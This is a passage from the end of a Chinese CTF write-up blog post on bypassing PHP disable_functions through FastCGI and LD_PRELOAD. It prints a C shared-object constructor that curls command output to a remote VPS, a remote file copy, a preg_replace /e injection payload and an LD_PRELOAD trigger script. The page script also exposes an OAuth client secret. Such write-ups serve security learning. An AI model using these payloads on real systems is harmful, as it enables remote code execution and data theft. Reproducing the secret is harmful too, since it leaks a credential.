+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+__attribute__ ((__constructor__)) void preload (void)
+{
+    system(&quot;curl vps:6666/`/readflag`&quot;);
+}</code></pre><p>通过shared命令编译<code>gcc hpdoger.c -fPIC -shared -o hpdoger.so</code>，依然是通过copy命令上传fastcgi.php和hpdoger.so，此时/tmp下应该有这两个文件</p>
+<pre><code>copy(&#39;http://vps/hpdoger.so&#39;,&#39;/tmp/hpdoger.so&#39;)</code></pre><p><img src="http://static.zybuluo.com/1160307775/jov8ot2pbsbpyzpaoft92is2/image_1dkatupe71fhkrvopqi1s0a1v5nm.png" alt="image_1dkatupe71fhkrvopqi1s0a1v5nm.png-272kB"></p>
+<p>直接包含fastcgi就能加载并调用hpdoger.so-&gt;bypass base_opendir-&gt;rce</p>
+<pre><code>find=.*/e%00&amp;replace=include(&#39;/tmp/fastcgi.php&#39;)&amp;id=4184&amp;regex=1`</code></pre><p><img src="http://static.zybuluo.com/1160307775/i53w4nd8brbyxs76jmx8bywu/image_1dkatnc0vgq56a717rh1dff1u7s9.png" alt="image_1dkatnc0vgq56a717rh1dff1u7s9.png-78.4kB"></p>
+<h3 id="LD-PRELOAD加载so"><a href="#LD-PRELOAD加载so" class="headerlink" title="LD_PRELOAD加载so"></a>LD_PRELOAD加载so</h3><p>前文提到mail被Disable_functions了，但是mail和error_log都调用了外部进程sendmail。这里编写一个php来调用error_log，然后代码执行包含这个/tmp下的php即可rce</p>
+<pre><code>&lt;?php
+putenv(&quot;LD_PRELOAD=/tmp/hpdoger.so&quot;);
+error_log(&#39;&#39;,1);
+?&gt;</code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>自闭点在于本地环境和远程环境真的是两个概念，mac环境gcc编译和ubuntu的gcc编译出来的东西天壤之别..</p>
+
+            </div>
+          
+           
+            <div class="copyright">
+                <div class="name">
+                    <a>本文作者:</a>
+                    <a>Hpdoger</a>
+                </div>
+                <div class="link">
+                    <a>本文链接:</a>
+                    <a class="permalink" href="https://hpdoger.cn/2019/09/17/从一道CTF学习Fastcgi绕过姿势/">https://hpdoger.cn/2019/09/17/从一道CTF学习Fastcgi绕过姿势/</a>
+                </div>
+                <div class="license">
+                    <a>版权声明:</a>
+                    <a>本博客所有文章除特别声明外，均采用许可协议 CC BY-NC-SA 3.0 CN。转载请注明出处！</a>
+                </div>
+            </div>
+            
+
+          
+
+
+</article>
+
+
+<div class="tip">
+<button class="tip-btn">
+    打赏
+</button>
+<div class="tip-img">
+<ul>
+    
+ 
+<li>
+    <img src="/img/wechat.jpg">
+</li>
+
+</ul>
+</div>
+</div>
+
+<div class="more">
+
+    <div class="prev">
+   <a href="/2019/09/24/RealWorld CTF2019 两道XSS-Web题解/">  RealWorld CTF2019 两道XSS-Web题解</a>
+    </div>
+
+<div></div>
+
+    <div class="next">
+    <a href="/2019/09/09/帝国(EmpireCMS)7.5的两个后台RCE审计/"> 帝国(EmpireCMS)7.5的两个后台RCE审计 </a>
+    </div>
+    
+</div>
+
+<div class="bdsharebuttonbox">
+<a href="#" class="bds_weixin fa fa-weixin" data-cmd="weixin" title="分享到微信" style="color:#1cbd8f">
+</a>
+<a href="#" class="bds_tsina fa fa-weibo" data-cmd="tsina" title="分享到新浪微博" style="color:#ff6363">
+</a>
+<a href="#" class="bds_twi fa fa-twitter" data-cmd="twi" title="分享到Twitter" style="color:#00A7EB">
+</a>
+<a href="#" class="bds_fbook fa fa-facebook" data-cmd="fbook" title="分享到Facebook" style="color:#00A7EB">
+</a>
+</div>
+<script>
+window._bd_share_config={
+    "common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"16"},
+    "share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='../../../../../static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+ 
+<div id="comments"></div>
+
+<script>
+    var gitment = new Gitment({
+    id: "Tue Sep 17 2019 00:00:00 GMT+0800",
+    owner: "Hpd0ger",
+    repo: "Hpd0ger.github.io",
+    oauth: {
+      client_id:"8d83609a651e972e308d",
+      client_secret: "37e40c89a47e957f654e86f71c5caaccad0774de",
+    }
+  })
+  gitment.render('comments')
+</script>
+    </main>
+    <a class="not-found">not found!</a>
+    <div class="search-items">
+    </div>
+    <a href="#header" id="top" style="display:none">
+        <i class="fa fa-sort-asc fa-2x"></i>
+    </a>
+    <footer class="footer">
+    <div class="footer-copyright">©️2017
+    <a href="//github.com/Vevlins/toki" class="link" target="_blank">Toki</a>  by Vevlins
+    </div>
+</footer>
+
+    <script src="/js/jquery.js"></script>
+    <script src="/js/toki.js"></script>  
+  <script>hljs.initHighlightingOnLoad();</script>
+</body>
+</html>
